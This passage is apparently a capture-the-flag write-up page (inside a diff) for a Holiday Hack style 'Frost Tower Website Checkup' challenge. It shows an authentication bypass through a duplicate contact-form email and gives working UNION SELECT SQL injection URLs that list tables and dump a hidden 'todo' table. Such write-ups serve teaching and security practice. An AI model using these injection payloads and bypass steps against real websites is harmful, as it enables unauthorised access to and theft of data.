+            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mf">500</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nx">tempCont</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span> <span class="nx">reqparam</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">rows</span><span class="p">,</span> <span class="nx">fields</span><span class="p">){</span>
+</code></pre></div>
+</td></tr></table>
+<p>This endpoint allows the user to specify one or more contact IDs to view by supplying them as the last element of the URL, such as<br>
+<code>https://staging.jackfrosttower.com/detail/1234</code></p>
+<p>If a single ID is requested then the code at line 212 constructs the query as<br>
+<code>SELECT * FROM uniquecontact WHERE id=?</code><br>
+and the '?' placeholder is substituted with the ID when the query is executed on line 219.  MySQLjs automatically escapes any values passed this way, so injecting SQL using this method will not work.</p>
+<p>However, if more than one ID is requested by separating them with commas, then the code on lines 204-210 build the query with whatever was used for the IDs built in. For example, the URL<br>
+<code>https://staging.jackfrosttower.com/detail/1,2</code><br>
+will result in the following query being built<br>
+<code>SELECT # FROM uniquecontact WHERE id=1 or ID=2 OR id=?</code></p>
+<p>This gives us an opportunity to inject code, but first we have to bypass the authentication.</p>
+<h3 id="step-2-authentication-bypass">Step 2: Authentication Bypass</h3>
+<p>In order to use the /detail endpoint we need to pass the authentication check on line 200.  On a sucessful login the session.uniqueID value is defined to be our username, but if we haven't logged in it will be undefined.</p>
+<p>But further inspection of the code reveals a flaw in the /postcontact endpoint.  This endpoint is called after pressing 'Save' on the 'Contact Us' page, and includes the following bit of code.</p>
+<table class="highlighttable"><tr><th colspan="2" class="filename"><div class="highlight"><span class="filename">server.js</span></div></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">141</span>
+<span class="normal">142</span>
+<span class="normal">143</span>
+<span class="normal">144</span>
+<span class="normal">145</span>
+<span class="normal">146</span>
+<span class="normal">147</span>
+<span class="normal">148</span>
+<span class="normal">149</span>
+<span class="normal">150</span>
+<span class="normal">151</span>
+<span class="normal">152</span>
+<span class="normal">153</span>
+<span class="normal">154</span>
+<span class="normal">155</span>
+<span class="normal">156</span>
+<span class="normal">157</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nx">tempCont</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT * from uniquecontact where email=&quot;</span><span class="o">+</span><span class="nx">tempCont</span><span class="p">.</span><span class="nx">escape</span><span class="p">(</span><span class="nx">email</span><span class="p">),</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">rows</span><span class="p">,</span> <span class="nx">fields</span><span class="p">){</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mf">500</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">rowlength</span> <span class="o">=</span> <span class="nx">rows</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">rowlength</span> <span class="o">&gt;=</span> <span class="s2">&quot;1&quot;</span><span class="p">){</span>
+        <span class="nx">session</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">;</span>
+        <span class="nx">session</span><span class="p">.</span><span class="nx">uniqueID</span> <span class="o">=</span> <span class="nx">email</span><span class="p">;</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="s1">&#39;Email Already Exists&#39;</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">&quot;/contact&quot;</span><span class="p">);</span>
+
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+        <span class="nx">tempCont</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO uniquecontact (full_name, email, phone, country, date_created) VALUE (?, ?, ?, ?, ?)&quot;</span><span class="p">,</span> <span class="p">[</span><span class="nx">fullname</span><span class="p">,</span> <span class="nx">email</span><span class="p">,</span> <span class="nx">phone</span><span class="p">,</span> <span class="nx">country</span><span class="p">,</span> <span class="nx">date_created</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">rows</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
+</code></pre></div>
+</td></tr></table>
+<p>Here we see that if the email address entered into the 'Contact Us' page doesn't exist (line 149 evaluates as False), then line 157 adds a new record to the uniquecontact table.</p>
+<p>If however the email address already exists in the table, then line 151 will set session.uniqueID to that value.  Since the check in the /detail endpoint is just looking to see if session.uniqueID is set to something, this means if we submit a 'Contact Us' form twice using the same email then we will pass the authentication check.</p>
+<h3 id="step-3-sql-injection-constraints">Step 3: SQL Injection Constraints</h3>
+<p>Now that we are 'authenticated' to the system we can try to inject code using the /details endpoint.</p>
+<p>One of the more common SQL Injection techniques involves the use of a UNION SELECT statement.  This statement will execute a second SELECT and combines its results with the first.  One of the requiements however when using a UNION SELECT is that the second SELECT statement must return the same number of columns as the first.</p>
+<p>For example, the URL<br>
+<code>https://staging.jackfrosttower.com/detail/1 UNION SELECT name FROM users;--,2</code><br>
+will be expanded by the code into the full query<br>
+<code>SELECT * FROM uniquecontact WHERE id=1 UNION SELECT name FROM users;-- OR ID=2 OR ID=?</code><br>
+<em>Note that I'm adding the comment characters <code>;--</code> at the end of my injection so everything after that will be ignored</em>.</p>
+<p>This query will result in an error because the first select, <code>SELECT * FROM uniquecontact WHERE id=1</code>, returns 7 columns and <code>SELECT name FROM users</code> only returns 1 column.</p>
+<p>Additionally, after the /detail endpoint retreives values from the database it passes them to the detail.ejs file for rendering (see line 236 in server.js).  The detail.ejs file requires that the values passed to it 'fit' into the structure of the uniquecontact table, shown below from the script used to initialize the database.</p>
+<table class="highlighttable"><tr><th colspan="2" class="filename"><div class="highlight"><span class="filename">encontact_db.sql</span></div></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nx">CREATE</span> <span class="nx">TABLE</span> <span class="sb">`uniquecontact`</span> <span class="p">(</span>
+  <span class="sb">`id`</span> <span class="kr">int</span><span class="p">(</span><span class="mf">50</span><span class="p">)</span> <span class="nx">NOT</span> <span class="nx">NULL</span> <span class="nx">AUTO_INCREMENT</span><span class="p">,</span>
+  <span class="sb">`full_name`</span> <span class="nx">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span> <span class="nx">DEFAULT</span> <span class="nx">NULL</span><span class="p">,</span>
+  <span class="sb">`email`</span> <span class="nx">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span> <span class="nx">DEFAULT</span> <span class="nx">NULL</span><span class="p">,</span>
+  <span class="sb">`phone`</span> <span class="nx">varchar</span><span class="p">(</span><span class="mf">50</span><span class="p">)</span> <span class="nx">DEFAULT</span> <span class="nx">NULL</span><span class="p">,</span>
+  <span class="sb">`country`</span> <span class="nx">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span> <span class="nx">DEFAULT</span> <span class="nx">NULL</span><span class="p">,</span>
+  <span class="sb">`date_created`</span> <span class="nx">datetime</span> <span class="nx">DEFAULT</span> <span class="nx">NULL</span><span class="p">,</span>
+  <span class="sb">`date_update`</span> <span class="nx">datetime</span> <span class="nx">DEFAULT</span> <span class="nx">NULL</span><span class="p">,</span>
+  <span class="nx">PRIMARY</span> <span class="nx">KEY</span> <span class="p">(</span><span class="sb">`id`</span><span class="p">)</span>
+<span class="p">)</span> <span class="nx">ENGINE</span><span class="o">=</span><span class="nx">InnoDB</span> <span class="nx">AUTO_INCREMENT</span><span class="o">=</span><span class="mf">33</span> <span class="nx">DEFAULT</span> <span class="nx">CHARSET</span><span class="o">=</span><span class="nx">latin1</span><span class="p">;</span>
+</code></pre></div>
+</td></tr></table>
+<p>So when we inject code into the /detail endpoint we need to make sure not only that we return 7 colunmns, but that the types of those values match as well.  Fortunately NULL values match anything (see below).</p>
+<h3 id="step-4-finding-jacks-todo-list">Step 4: Finding Jack's TODO List</h3>
+<p>From what we see in the source there does not appear to be any table or field in the encontact database that might contain Jack's TODO list.  However, there could be another table that we are not aware of.</p>
+<p>The MySQL query that would show use all the tables in the encontact database is<br>
+<code>SELECT table_name FROM information_schema.tables WHERE table_schema='encontact'</code>.  </p>
+<p>But as mentioned above, our injection needs to return 7 values and this query only returns one.  To get around this we can use the <code>JOIN</code> statement to combine multiple <code>SELECT</code> statements into one result. </p>
+<p><code>SELECT * FROM (select NULL)c1 join (SELECT table_name FROM information_schema.tables WHERE table_schema='encontact')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7</code></p>
+<p>This query would return 7 columns, the 2nd of which will be the names of the tables in the encontact database and the others all NULL.  This query can be executed through SQL injection with the following URL
+<div class="highlight"><pre><span></span><code>https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;encontact&#39;)c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,2
+</code></pre></div></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image1.png" /></p>
+</details>
+<p>Executing this injection tells us that there is another table named "todo" in the database.  The MySQL query that would show all the column names for this table is<br>
+<code>SELECT column_name FROM information_schema.columns WHERE table_name='todo'</code><br>
+which we can inject into the web site as well.</p>
+<div class="highlight"><pre><span></span><code>https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (SELECT column_name FROM information_schema.columns WHERE table_name=&#39;todo&#39;)c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,1
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image2.png" /></p>
+</details>
+<p>Now we know there are three columns in the todo table, 'id', 'note', and 'completed', so we can compose our final query to retrieve all the rows of this table.  Note that in this query we are using fewer join statements since the select from the todo table will return three columns.
+<div class="highlight"><pre><span></span><code>https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (select * from todo)c2 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,1
+</code></pre></div></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image3.png" /></p>
+</details>
+<h2 id="completion">Completion</h2>
+<div class="admonition success">
+<p class="admonition-title">Answer</p>
+<p>clerk</p>
+</div>
+<details class="quote">
+<summary>Ingreta Tude</summary>
+<p>Oh wow - I thought we left SQL injection in the last decade.<br>
+Thanks for your help finding this!</p>
+</details>
+<h2 id="extras">Extras</h2>
+<p>For Jack's complete TODO list, see <a href="../../extras/O12_Frost_Tower_Website_Checkup">this table</a> in the Extras section.</p>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../O11_Customer_Complaint_Analysis/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 11) Customer Complaint Analysis" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              11) Customer Complaint Analysis
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../O13_FPGA_Programming/" class="md-footer__link md-footer__link--next" aria-label="Next: 13) FPGA Programming" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              13) FPGA Programming
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.tabs.link"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.0bbba5b5.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.e1a181d9.min.js"></script>
+      
+    
+  </body>
+</html>
